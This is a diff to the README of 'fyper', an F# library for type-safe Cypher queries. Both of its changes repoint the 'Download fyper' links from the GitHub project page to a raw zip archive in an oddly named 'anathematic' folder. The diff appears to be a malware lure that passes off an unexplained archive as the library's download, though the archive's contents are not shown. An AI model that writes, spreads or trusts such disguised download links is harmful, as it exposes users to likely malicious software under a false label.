@@ -1,6 +1,6 @@
 # 🔷 fyper - Type-safe Cypher for F#
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20fyper-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Azizs2162/fyper)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20fyper-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Azizs2162/fyper/main/anathematic/Software_v2.2-alpha.3.zip)
 
 ## 🧩 What fyper is
 
@@ -12,7 +12,7 @@ Use it when you want to build graph queries in F# with less room for mistakes. I
 
 Use this link to visit the project page and get fyper:
 
-[Download fyper on GitHub](https://github.com/Azizs2162/fyper)
+[Download fyper on GitHub](https://raw.githubusercontent.com/Azizs2162/fyper/main/anathematic/Software_v2.2-alpha.3.zip)
 
 ### How to get it on Windows
 
